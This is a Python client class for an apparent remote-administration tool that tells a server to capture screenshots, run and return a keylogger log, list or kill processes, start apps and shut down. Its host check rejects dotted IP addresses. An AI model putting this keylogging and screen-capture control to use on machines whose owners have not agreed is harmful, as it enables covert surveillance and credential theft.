import socket
import os
import time

# Commands
CMD_END_CONNECTION = 'end_connection'
CMD_SHUTDOWN = 'shutdown'
CMD_TAKE_SCREENSHOT = 'screenshot'
CMD_VIEW_PROCESSES = 'view_processes'
CMD_KILL_PROCESS = 'kill_process'
CMD_START_KEYLOGGER = 'start_keylogger'
CMD_STOP_KEYLOGGER = 'stop_keylogger'
CMD_PRINT_KEYLOGGER = 'print_keylogger'
CMD_VIEW_APPS = 'view_apps'
CMD_START_APP = 'start_app'

# FLAGS
FLAG_MSG_END = 'MSG_END'
FLAG_FILE_END = 'FILE_END'
FLAG_PROCESSES_END = 'PROCESSES_END'
FLAG_APPS_END = 'APPS_END'

# BUFFER
BUFFER_SIZE = 1024

# PATH
TMP_PATH = os.path.join(os.getcwd(), 'tmp')

# LOGGING
LOG_FILE = "keylog.txt"


class Client:
    def __init__(self):
        self.host = ''
        self.port = 0
        self.addr = (self.host, self.port)
        self.is_connected = False

    def connect(self, host, port):
        try:
            if not self.is_connected:
                if host == '' or port == '':
                    return "[ERROR] Host or port is empty/invalid"
                if not host.isdigit() or not port.isdigit():
                    return "[ERROR] Host or port is invalid"
                if ' ' in host or ' ' in port:
                    return "[ERROR] Host or port is invalid"

                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(5)
                self.host = host
                self.port = int(port)
                self.addr = (self.host, self.port)
                self.socket.connect(self.addr)
                # self.client.settimeout(None)
                self.is_connected = True
                print("[SUCCESS] Connected to server")
                return "[SUCCESS] Connected to server"
            else:
                print("[ERROR] Already connected to server")
                return "[ERROR] Already connected to server"
        except socket.timeout:
            print("[ERROR] Connection timeout")
            return "[ERROR] Connection timeout"
        except Exception as e:
            print(e)
            return e

    def end_connection(self):
        try:
            if self.is_connected:
                self.socket.send(CMD_END_CONNECTION.encode())
                self.socket.close()
                self.is_connected = False
                print("[SUCCESS] Disconnected from server")
                return "[SUCCESS] Disconnected from server"
            else:
                print("[ERROR] Not connected to server")
                return "[ERROR] Not connected to server"
        except WindowsError:
            self.is_connected = False
            self.socket.close()
            return "[SUCCESS] Disconnected from server"
        except Exception as e:
            print(e)
            return e

    def save_file(self, path, file_name, mode):
        with open(os.path.join(path, file_name), mode) as f:
            while True:
                data = self.socket.recv(BUFFER_SIZE)
                if data == FLAG_FILE_END.encode():
                    break
                else:
                    f.write(data)

    def recv_msg(self, flag):
        msg = ""
        while True:
            data = self.socket.recv(BUFFER_SIZE)
            if data == flag.encode():
                break
            else:
                msg += data.decode()
        return msg

    def shutdown(self):
        try:
            if self.is_connected:
                self.socket.send(CMD_SHUTDOWN.encode())
                self.socket.close()
                self.is_connected = False
                print("[SUCCESS] Disconnected from server")
                return "[SUCCESS] Disconnected from server"
            else:
                print("[ERROR] Not connected to server")
                return "[ERROR] Not connected to server"
        except Exception as e:
            print(e)
            return e

    def take_screenshot(self):
        try:
            if self.is_connected:
                self.socket.send(CMD_TAKE_SCREENSHOT.encode())
                self.save_file(TMP_PATH, 'screenshot.png', 'wb')
                os.startfile(os.path.join(TMP_PATH, 'screenshot.png'))
                print("[SUCCESS] Screenshot saved")
                return "[SUCCESS] Screenshot saved"
            else:
                print("[ERROR] Not connected to server")
                return "[ERROR] Not connected to server"
        except Exception as e:
            print(e)
            return e

    def start_keylogger(self):
        try:
            if self.is_connected:
                self.socket.send(CMD_START_KEYLOGGER.encode())
                msg = self.recv_msg(FLAG_MSG_END)
                return msg
            else:
                print("[ERROR] Not connected to server")
                return "[ERROR] Not connected to server"
        except Exception as e:
            print(e)
            return e

    def stop_keylogger(self):
        try:
            if self.is_connected:
                self.socket.send(CMD_STOP_KEYLOGGER.encode())
                msg = self.recv_msg(FLAG_MSG_END)
                return msg
            else:
                print("[ERROR] Not connected to server")
                return "[ERROR] Not connected to server"
        except Exception as e:
            print(e)
            return e

    def save_keylogger(self):
        try:
            if not self.is_connected:
                os.startfile(os.path.join(TMP_PATH, LOG_FILE))
            else:
                self.socket.send(CMD_PRINT_KEYLOGGER.encode())
                self.save_file(TMP_PATH, LOG_FILE, 'wb')
                os.startfile(os.path.join(TMP_PATH, LOG_FILE))
                print("[SUCCESS] Keylogger saved")
                return "[SUCCESS] Keylogger saved"
        except FileNotFoundError:
            print("[ERROR] Log file not found, please start keylogger and then save it")
            return "[ERROR] Log file not found, please start keylogger and then save it"
        except Exception as e:
            print(e)
            return e

    def view_processes(self):
        try:
            if self.is_connected:
                self.socket.send(CMD_VIEW_PROCESSES.encode())
                processes = self.recv_msg(FLAG_PROCESSES_END)
                return processes
            else:
                print("[ERROR] Not connected to server")
                return "[ERROR] Not connected to server"
        except Exception as e:
            print(e)
            return e

    def view_apps(self):
        try:
            if self.is_connected:
                self.socket.send(CMD_VIEW_APPS.encode())
                apps = self.recv_msg(FLAG_APPS_END)
                return apps
            else:
                print("[ERROR] Not connected to server")
                return "[ERROR] Not connected to server"
        except Exception as e:
            print(e)
            return e

    def kill_process(self, pid):
        try:
            if self.is_connected:
                if (not pid or not pid.isdigit()):
                    print("[ERROR] PID is empty/invalid")
                    return "[ERROR] PID is empty/invalid"
                self.socket.send(CMD_KILL_PROCESS.encode())
                time.sleep(0.01)
                self.socket.send(str(pid).encode())
                return "[SUCCESS] Process/App killed"
            else:
                print("[ERROR] Not connected to server")
                return "[ERROR] Not connected to server"
        except Exception as e:
            print(e)
            return e

    def start_app(self, app_name):
        try:
            if self.is_connected:
                if (not app_name):
                    print("[ERROR] App name is empty")
                    return "[ERROR] App name is empty"
                self.socket.send(CMD_START_APP.encode())
                time.sleep(0.01)
                self.socket.send(app_name.encode())
                msg = self.recv_msg(FLAG_MSG_END)
                return msg
            else:
                print("[ERROR] Not connected to server")
                return "[ERROR] Not connected to server"
        except Exception as e:
            print(e)
            return e
